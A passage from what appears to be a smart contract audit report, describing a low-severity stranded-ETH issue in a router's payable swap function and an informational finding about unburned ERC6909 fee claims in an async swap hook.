`Router.swap` is payable with no `msg.value` guard ([Router.sol:64](Router.sol#L64)). `input.settle(POOLMANAGER, user, orderData.order.amountIn, false)` forwards only `amountIn` to PoolManager ([Router.sol:143](Router.sol#L143)); the residual `msg.value − amountIn` stays in `Router.balance` with no recovery path.

**Severity**: Low  **Confidence**: High  **Class**: TokenEdgeCases
**Location**: `Router.sol:swap`

Note: the *attacker-extractable* compounding of this stranded ETH is captured under [H-03] above, which is the load-bearing severity. This entry tracks the standalone lock as a separate code-quality issue.


---

### [I-01] Fee-path 6909 leak — `feeAmount` portion of `amountTaken` is never burned

**What's wrong**

`_beforeSwap` takes the full `amountTaken` of input as ERC6909, but stores only `finalTaken = amountTaken − feeAmount` in the order record. If fee logic is ever activated, the `feeAmount` portion of the 6909 claim sits in the hook permanently — no order references it, no `fill`/`cancel` path burns it, and no sweep exists.

**How (mechanism)**

`AsyncSwap._beforeSwap` calls `specified.take(poolManager, address(this), amountTaken, true)` ([AsyncSwap.sol:171](AsyncSwap.sol#L171)). It then computes `finalTaken = amountTaken − feeAmount` ([AsyncSwap.sol:174](AsyncSwap.sol#L174)) and stores only `finalTaken` via `_createOrder` ([AsyncSwap.sol:176](AsyncSwap.sol#L176)). The `BeforeSwapDelta` returned uses the full `amountTaken` ([AsyncSwap.sol:184](AsyncSwap.sol#L184)), so PM accounting balances. `AsyncFiller.fill` burns exactly `info.amountIn = finalTaken` ([AsyncFiller.sol:120-121](AsyncFiller.sol#L120-L121)). `calculatePoolFee` is hard-coded to return 0 and is not `virtual` ([AsyncSwap.sol:118-120](AsyncSwap.sol#L118-L120)), so the bug cannot manifest in v1 — but the structural invariant is violated for any future fee activation.

**Severity**: Informational  **Confidence**: High  **Class**: DeltaAccounting
**Location**: `AsyncSwap.sol:_beforeSwap`

